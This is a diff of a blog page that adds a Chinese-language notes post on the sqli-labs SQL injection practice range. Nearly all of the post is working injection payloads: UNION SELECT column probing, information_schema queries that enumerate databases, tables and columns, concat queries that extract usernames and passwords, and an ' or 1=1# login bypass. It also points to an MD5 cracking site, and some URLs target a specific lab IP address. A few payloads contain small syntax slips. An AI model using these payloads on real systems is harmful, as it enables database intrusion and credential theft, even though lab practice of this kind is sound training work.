@@ -13,7 +13,7 @@
 
 
 
-<title>union | BYJ</title>
+<title>sqli-labs靶场 &lt;br/&gt; | BYJ</title>
 
 
 
@@ -131,7 +131,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">union</h1>
+            <h1 class="post-title">sqli-labs靶场 &lt;br/&gt;</h1>
             
                 <div class="post-meta">
                     
@@ -149,7 +149,71 @@
         </header>
 
         <div class="post-content">
-            
+            <html lang="en">
+<head>
+<meta charset="UTF-8">
+</head>
+<body>
+
+<p><font size="5" color="red">sqli-labs</font><br/></p>
+<p>**</p>
+<pre><code>?id=1&#39; order by 3 --+   #字段数为3
+?id=1&#39; and 1=2 union select 1,2,3 --+  #显示位为2，3
+</code></pre>
+<hr>
+<pre><code>获取数据库中信息，用户、版本、数据库名等：
+1&#39; union select version(),user() --+
+</code></pre>
+<p>**</p>
+<pre><code>user():返回当前数据库用户
+version():返回当前数据库版本
+database:返回数据库名
+Concat():将多个字符串链接成一个字符串
+Concat_ws():同上，但可以指定分隔符
+Group_concat():将多行结果连接成一组
+</code></pre>
+<p>**</p>
+<pre><code>*查询所有数据库名
+http://45.32.113.109:25040/Less-1/?id=1&#39; AND 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+
+
+*查询第三个数据库中的表名：
+http://45.32.113.109:25040/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database --+
+
+*查询users表中的列名：
+http://45.32.113.109:25040/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&quot;users&quot; --+
+
+*获取数据库中信息，查看账号密码：
+1&#39; union select 1,concat(user,password) from users --+
+1&#39; union select 1,concat_ws(&#39;_&#39;,user.password) from users --+
+</code></pre>
+<hr>
+<pre><code>获取数据库中信息：破解加密数据
+Md5解密网站：https://www.cmd5.com/
+</code></pre>
+<p>**</p>
+<p>sql注入</p>
+<pre><code>实验过程：
+1、输入IP地址，进入实验页面
+2、使用万能密码（&#39; or 1=1#）绕过登录页面（登录成果有两个sql注入实验：字符型注入和联合注入）
+3、数字型注入
+   语句：select 字段名 from 数据库名，表名 limit 0,1
+   结果：返回username第一条数据，通过改变limit中第一位数字获取其他数据
+</code></pre>
+<p>**</p>
+<pre><code>information_schema:         表示所有信息，包括库、表、列
+information_schema.tables:  记录所有表名信息的表
+information_schema.columns: 记录所有列名信息的表
+table_schema:               数据库名称
+table_name:                 表名
+column_name:                列名
+group_concat():             显示所有查询到的数据
+</code></pre>
+</body>
+</html>
+
+
+
+
         </div>
 
         
